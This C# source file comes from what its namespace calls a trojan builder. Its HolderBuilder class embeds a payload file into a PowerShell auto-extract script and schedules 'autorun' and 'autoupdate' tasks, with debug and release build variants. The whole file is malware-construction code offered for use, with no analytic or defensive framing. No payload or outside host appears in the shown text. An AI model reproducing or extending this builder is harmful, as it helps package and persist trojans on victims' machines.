namespace TroyanBuilder;

public abstract class HolderBuilder: CustomBuilder
{
    protected override string SourceDir => Path.Combine(L.TroyanScriptDir, "holder");
    protected override string OutputFile => L.Holder;
    
    protected override string[] PriorityTasks => new [] { "autorun" };
    protected override string[] UnpriorityTasks => new [] {"autoupdate" };
    protected override string EntryPoint => "holder";

    protected override void InternalBuild(string server)
    {
        MakeAutoExtract();
    }

    public void MakeAutoExtract()
    {
        var template = @"
$xbody = ""__BODY""
";
        var body = File.ReadAllText(L.Body);
        template = template.Replace("__BODY", body);
        var outputPath = Path.Combine(L.TroyanScriptDir, "holder", "consts_autoextract.ps1");
        File.WriteAllText(outputPath, template);
    }
    
    protected override List<SourceFile> GetSourceFiles()
    {
        var sourceFiles = base.GetSourceFiles();
        sourceFiles.Insert(0, new SourceFile("utils", this));
        sourceFiles.Insert(0, new SourceFile("consts_body", this));
        return sourceFiles;
    }
}

public class HolderBuilderDebug : HolderBuilder
{
    protected override string OutputFile => L.HolderDebug;
}

public class HolderBuilderRelease : HolderBuilder
{
    protected override string OutputFile => L.HolderRelease;
}